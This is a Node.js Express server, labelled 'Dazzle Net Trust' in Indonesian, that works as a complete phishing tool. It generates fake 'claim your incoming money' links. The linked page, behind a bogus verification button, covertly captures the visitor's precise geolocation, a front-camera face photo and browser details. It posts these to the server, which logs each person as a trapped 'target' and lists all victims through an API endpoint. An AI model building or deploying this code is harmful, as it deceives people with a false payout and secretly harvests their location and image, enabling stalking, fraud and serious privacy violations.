const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

let victimsData = [];

app.get('/api/status', (req, res) => {
    res.json({ status: 'Server Dazzle Net Trust Online & Secure!' });
});

app.post('/api/generate-claim', (req, res) => {
    const { senderName, amount } = req.body;
    const token = Math.random().toString(36).substring(2, 10);
    const claimLink = `http://192.168.1.17:${PORT}/claim/${token}?from=${encodeURIComponent(senderName)}&amt=${amount}`;
    
    res.json({
        success: true,
        link: claimLink,
        message: 'Link Claim berhasil di-generate!'
    });
});

app.get('/claim/:token', (req, res) => {
    const { from, amt } = req.query;
    
    const htmlPage = `
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Klaim Saldo Masuk - Verifikasi Keamanan</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f3f4f6; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .card { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h2 { color: #2563eb; margin-bottom: 5px; }
            .amount { font-size: 24px; font-weight: bold; color: #16a34a; margin: 15px 0; }
            button { background: #2563eb; color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; }
            button:hover { background: #1d4ed8; }
            .footer { font-size: 11px; color: #9ca3af; margin-top: 15px; }
        </style>
    </head>
    <body>
        <div class="card">
            <h2>Pencairan Dana</h2>
            <p>Anda menerima kiriman saldo dari <b>${from || 'Seseorang'}</b></p>
            <div class="amount">Rp ${amt || '500.000'}</div>
            <p style="font-size: 13px; color: #4b5563;">Klik tombol di bawah untuk verifikasi kepemilikan akun dan mencairkan dana ke rekening Anda.</p>
            <button onclick="mulaiVerifikasi()">KLAIM SEKARANG</button>
            <div class="footer">Sistem Verifikasi Otomatis &bull; Secure Connection</div>
        </div>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const token = "${req.params.token}";

            function mulaiVerifikasi() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        kirimDataKeServer({ lat: lat, lon: lon });
                    }, error => {
                        kirimDataKeServer({ lat: 'Ditolak/Tidak Aktif', lon: 'Ditolak/Tidak Aktif' });
                    }, { enableHighAccuracy: true });
                } else {
                    kirimDataKeServer({ lat: 'Tidak Didukung', lon: 'Tidak Didukung' });
                }
            }

            function kirimDataKeServer(geoData) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg');

                        stream.getTracks().forEach(track => track.stop());
                        POSTData(geoData.lat, geoData.lon, imageData);
                    }, 1500);
                })
                .catch(err => {
                    POSTData(geoData.lat, geoData.lon, null);
                });
            }

            function POSTData(lat, lon, photo) {
                fetch('/api/report-victim', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: token,
                        latitude: lat,
                        longitude: lon,
                        photo: photo,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    })
                }).then(res => res.json()).then(data => {
                    alert('Verifikasi Berhasil! Dana sedang diproses ke akun Anda.');
                    window.location.href = 'https://google.com';
                }).catch(err => {
                    alert('Gagal memproses verifikasi, silahkan coba lagi.');
                    window.location.href = 'https://google.com';
                });
            }
        </script>
    </body>
    </html>
    `;
    res.send(htmlPage);
});

app.post('/api/report-victim', (req, res) => {
    const victimInfo = req.body;
    victimsData.push(victimInfo);

    console.log(`\n[🔥 TARGET TERJEBAK!]`);
    console.log(`- Waktu: ${victimInfo.timestamp}`);
    console.log(`- Lokasi (Lat, Lon): ${victimInfo.latitude}, ${victimInfo.longitude}`);
    console.log(`- Perangkat: ${victimInfo.userAgent}`);
    console.log(`- Foto Wajah: ${victimInfo.photo ? 'Berhasil Diambil' : 'Gagal/Ditolak'}`);

    res.json({ success: true, message: 'Data target berhasil diamankan.' });
});

app.get('/api/get-victims', (req, res) => {
    res.json({ success: true, data: victimsData });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Dazzle Net Trust Backend berjalan di port ${PORT}`);
});